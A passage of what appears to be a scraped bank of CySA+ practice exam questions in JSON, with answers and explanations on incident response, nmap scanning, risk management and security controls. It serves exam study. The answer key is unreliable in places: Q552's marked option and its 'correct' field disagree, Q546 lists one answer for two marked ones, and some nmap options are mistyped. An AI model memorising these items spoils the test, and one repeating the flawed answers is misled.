Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Installing and configuring a data loss prevention tool</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Subscribing to an identity proofing service for all employees</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Conducting thorough background checks on all incoming employees</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Utilizing user behavioral analytics-based detections implemented in the security information and event management (SIEM)</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"E\">E.&nbsp;</span>Deploying a fully featured endpoint detection and response (EDR)</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"F\">F.&nbsp;</span>Validating identification information manually</li></ul></div><!--EndFragment-->","correct":"D","explanation":"D. UEBA/SIEM → Detects abnormal user behavior and activity patterns.\nE. EDR → Provides endpoint activity/telemetry to identify attacker techniques."},{"number":547,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is the main concept behind the use of an attack methodology framework?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Implementing continuous monitoring and rapid deployment of system fixes over the traditional patch, test, and deploy approach</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Prioritizing vulnerabilities that can be exploited based on risk calculations and using the consequences and likelihood of the exploits to determine where resources should be allocated</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Approaching cybersecurity from the perspective of a threat actor and using their common behaviors and motivations to identify secure solutions</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Applying a Zero Trust environment by assuming networks and systems are vulnerable to malicious actions by both external, hostile adversaries and insider threats</li></ul></div><!--EndFragment-->","correct":"C","explanation":"An attack methodology framework examines how attackers think and operate—their behaviors, techniques, motivations, and attack patterns."},{"number":548,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst reviews the public-facing attack surface of a network that contains both Windows and Linux servers. Which of the following commands is the best way to identify the services running?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>nmap -O -p- -iL hosts.txt</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>nmap -sV -pl-1024 -iL hosts.txt</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>nmap -sP -A -iL hosts.txt</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>nmap -sn -vvvv -iL hosts.txt</li></ul></div><!--EndFragment-->","correct":"B","explanation":"-sV performs service/version detection, which identifies the services running on open ports."},{"number":549,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following can a software provider use to implement secure authentication and authorization mechanisms that leverage existing controls in-place on their customers' environments?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>SSO</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>SASE</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>PAM</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>CASB</li></ul></div><!--EndFragment-->","correct":"A","explanation":"SSO allows a software provider to use the customer's existing identity provider and authentication controls (such as MFA, Entra ID, Okta) rather than creating separate credentials."},{"number":550,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">As part of a quality assurance test, a developer wants to examine how the code behaves after an application has been fully compiled and is running. Which of the following best describes the type of testing that the developer should perform?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Black box</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Static</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Dynamic</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Diagnostic</li></ul></div><!--EndFragment-->","correct":"C","explanation":"Dynamic testing examines how an application behaves while it is running."},{"number":551,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst is scanning an ICS host (192.168.1.5) in an industrial plant for insecure ports while minimizing the impact to uptime or performance. Which of following commands should the analyst use to perform the task?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>nmap 192.168.1.5 -Т1 -P 21</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>nmap 192.168.1.5 -T2 -P 3389</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>nmap 192.168.1.5 -T3 -P 22</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>nmap 192.168.1.5 -T5 -P 80</li></ul></div><!--EndFragment-->","correct":"A","explanation":"Nmap's timing templates range from T0 (slowest) to T5 (fastest/aggressive)."},{"number":552,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst discovers several vulnerabilities on a critical legacy system. The analyst must recommend a solution with the following limitations:<br><br>• No downtime is permitted due to criticality.<br>• Patches for the vulnerabilities do not exist.<br>• No redundancy systems are in place.<br><br>Which of the following is the best risk management strategy to implement?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Transference</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Mitigation</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Avoidance</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Acceptance</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The key clues are:\n\nNo downtime permitted\nNo patches exist\nNo redundancy\nThe system is critical\n\nSince the vulnerabilities cannot currently be fixed or eliminated, the organization must accept the residual risk while continuing to operate the system."},{"number":553,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following best describes the reason a root cause analysis is an important part of the incident response process?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Compliance teams can be legally required to conduct a post-incident root cause analysis to satisfy regulatory requirements.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Response teams can use the analysis to isolate a system while the incident is ongoing to prevent further contamination.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>The organization can use the results of the analysis to provide stakeholders with assurances that customer data was not disclosed.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>The leadership team can better allocate resources to address systemic issues that span multiple groups in an organization.</li></ul></div><!--EndFragment-->","correct":"D","explanation":"Root cause analysis identifies the underlying/systemic problem, not just the immediate symptom. This helps leadership fix recurring issues and allocate resources appropriately."},{"number":554,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following will most likely help decrease false positives?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Automating escalation</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>A security operations center (SOC) dashboard</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Threat hunting</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Alert tuning</li></ul></div><!--EndFragment-->","correct":"D","explanation":"Alert tuning adjusts detection rules, thresholds, and conditions to reduce unnecessary alerts while keeping genuine threats detectable."},{"number":555,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst reviews the following finding and reports it to the development team:<br><br><img src=\"https://img.examtopics.com/cs0-003/image134.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>The development team concludes that this finding is a false positive. Which of the following is the next best course of action?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Tune the scan fingerprinting settings.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Manually verify the finding.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Close the finding as false-positive.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Upgrade the Apache Hypertext Transfer Protocol (HTTP) server to the latest version.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"E\">E.&nbsp;</span>Run a credentialed scan.</li></ul></div><!--EndFragment-->","correct":"B","explanation":"If the development team says the scanner finding is a false positive, the analyst should manually validate it before closing or changing the scan configuration."},{"number":556,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is a reason the false-positive rate is an important metric for incident response reporting and communication?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>A high false-positive rate indicates that the alerting rules are not sensitive enough.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>A high false-positive rate can help the response team prioritize critical events.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>A high false-positive rate validates that the incident response plan is working well.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>A high false-positive rate can result in wasted time and resources.</li></ul></div><!--EndFragment-->","correct":"D","explanation":"A high false-positive rate means analysts spend time investigating alerts that aren't real threats, reducing SOC efficiency."},{"number":557,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following best explains compensating controls?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>A compensating control is implemented when a vulnerability cannot be remediated.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>A compensating control is deployed after systems have been brought into compliance.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>A compensating control addresses the threat side of the risk equation rather than the vulnerability side.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>A compensating control completely remediates vulnerabilities that are too costly to fix.</li></ul></div><!--EndFragment-->","correct":"A","explanation":"A compensating control is an alternative security measure used to reduce risk when the primary control/remediation isn't feasible.\n\nExample: A legacy system can't be patched → network segmentation or additional monitoring can compensate."},{"number":558,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst detects that a large amount of data is being exfiltrated. The data contains confidential customer information. Which of the following should be done first in this situation?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Contact public relations so they can communicate with customers.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Identify stakeholders and communicate with them.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Inform law enforcement about the activities.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Declare an incident and contain the affected servers.</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The key clue is active data exfiltration. The priority is to stop the ongoing loss and contain the compromised systems."},{"number":559,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A BIA document was recently updated to include new critical systems. Which of the following is the most important reason for the update?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>To create a business case that explains the importance of the systems</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>To ensure the systems receive the proper priority in a DR scenario</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>To include vendor-specific IR training in the security budget</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>To add the systems to forensic analysis in case of a data breach</li></ul></div><!--EndFragment-->","correct":"B","explanation":"A Business Impact Analysis (BIA) identifies critical systems/processes and determines their business impact and recovery priorities."},{"number":560,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A company's Zero Trust network requires reauthentication with MFA every two hours. Which of the following is an advantage of this architecture?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Reduces the time an attacker can use compromised credentials</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Increases the accuracy of user and device asset inventories</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Rotates the encryption key to prevent brute forcing</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Prevents the recurring use of rainbow tables</li></ul></div><!--EndFragment-->","correct":"A","explanation":"Requiring MFA reauthentication every two hours limits the window in which stolen credentials can be abused."},{"number":561,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Cybersecurity analysts determine that SIEM alerts are true positives and an internal application is being attacked. Which of the following is a critical step to understanding the impact on the business at this stage?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Notification of the legal team</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Knowledge of any regulatory requirements</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Root cause analysis</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Identification of stakeholders</li></ul></div><!--EndFragment-->","correct":"D","explanation":"To understand the business impact, the team needs to identify who is affected or responsible—business owners, application owners, management, legal, compliance, etc."},{"number":562,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is an example of the shift-left concept as it pertains to the SDLC?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Scanning for API keys in code committed to the development repository</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Installing EDR protection on all microservices</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Conducting monthly vulnerability scans against quality assurance servers</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Automating DAST scans against public web applications</li></ul></div><!--EndFragment-->","correct":"A","explanation":"Shift-left means moving security earlier in the SDLC, ideally into development."},{"number":563,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An administrator at a partner organization does not know if an assigned task is authorized. To find the answer, which of the following is the best document to refer to?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Service-level agreement</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Executive summary</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Memorandum of understanding</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Compliance report</li></ul></div><!--EndFragment-->","correct":"C","explanation":"An MOU documents the agreed-upon roles, responsibilities, scope, and expectations between organizations. It can clarify whether a partner organization is authorized to perform a particular task."},{"number":564,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is the IR activity in which process gaps are identified?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Root cause analysis</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>User training</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Tabletop exercise</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Lessons learned</li></ul></div><!--EndFragment-->","correct":"D","explanation":"Lessons learned is the IR activity where the team reviews what happened and identifies process gaps, weaknesses, and improvements after an incident or exercise."},{"number":565,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following should be configured in a WAF to mitigate an RCE attack?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Rate control in deny mode</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Rule to detect and block OS commands</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Parameterized queries</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Stored procedure in the database</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The attack is Remote Code Execution (RCE), so the WAF should detect and block malicious OS command patterns."},{"number":566,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Two organizations are assessing a partnership to exchange security information and share resources in case an incident occurs. The assessment is in the pre-contract stage, and no detailed definitions have been made by management. Which of the following is the best artifact to formalize the agreement at the current stage?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>MOU</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>SLA</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" 